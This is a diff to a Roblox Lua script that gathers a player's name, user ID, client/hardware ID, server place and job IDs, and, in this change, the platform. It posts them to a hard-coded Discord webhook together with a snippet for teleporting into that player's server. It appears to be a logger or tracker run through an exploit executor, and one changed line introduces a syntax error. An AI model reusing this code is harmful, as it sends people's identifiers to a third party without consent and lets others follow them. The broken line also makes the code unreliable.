@@ -3,6 +3,7 @@ local function sendTeleportInfoAndPrepareScript()
     local HttpService = game:GetService("HttpService")
     local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
     local TeleportService = game:GetService("TeleportService")
+    local UserInputService = game:GetService("UserInputService")
 
     -- Replace this with your webhook URL
     local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"
@@ -20,6 +21,18 @@ local function sendTeleportInfoAndPrepareScript()
         local HWID = RbxAnalyticsService:GetClientId()
         local placeId = game.PlaceId
         local jobId = game.JobId
+
+        -- Determine the platform
+        local platform
+        if UserInputService.TouchEnabled then
+            platform = "Mobile"
+        elseif UserInputService.KeyboardEnabled then
+            platform = "PC"
+        elseif UserInputService.GamepadEnabled then
+            platform = "Console"
+        else
+            platform = "Unknown"
+        end
 
         local requestMethod = "Unknown"
         local response = nil
@@ -99,14 +112,14 @@ local function sendTeleportInfoAndPrepareScript()
 
         -- Check response status
         if response and (response.StatusCode == 200 or response.StatusCode == 204) then
-            print("Successfully")
+            print("Successfully sent initial test message")
         else
-            warn("failed"))
+            warn("Failed to send initial test message")
         end
 
         -- Create payload to send to Discord
         local data = {
-            ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
+            ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nPlatform: " .. platform .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
         }
 
         -- Convert data to JSON format
@@ -168,7 +181,7 @@ local function sendTeleportInfoAndPrepareScript()
             response = fetch(webhookUrl, {
                 Method = "POST",
                 Headers = {
-                    ["Content-Type"] = "application/json"
+                    ["Content-Type": "application/json"
                 },
                 Body = jsonData
             })
@@ -178,9 +191,9 @@ local function sendTeleportInfoAndPrepareScript()
         end
 
         if response and (response.StatusCode == 200 or response.StatusCode == 204) then
-            print("Successfully")
+            print("Successfully sent player info")
         else
-            warn("Failed: " .. (response and response.StatusMessage or "unknown error"))
+            warn("Failed to send player info: " .. (response and response.StatusMessage or "unknown error"))
         end
     end
 
@@ -204,10 +217,5 @@ end
 -- Invoke the function to send teleport information and prepare teleport script
 sendTeleportInfoAndPrepareScript()
 
---------------------------------
-
---------------------------------
-
---------------------------------
-
-
+____________________
+____________________
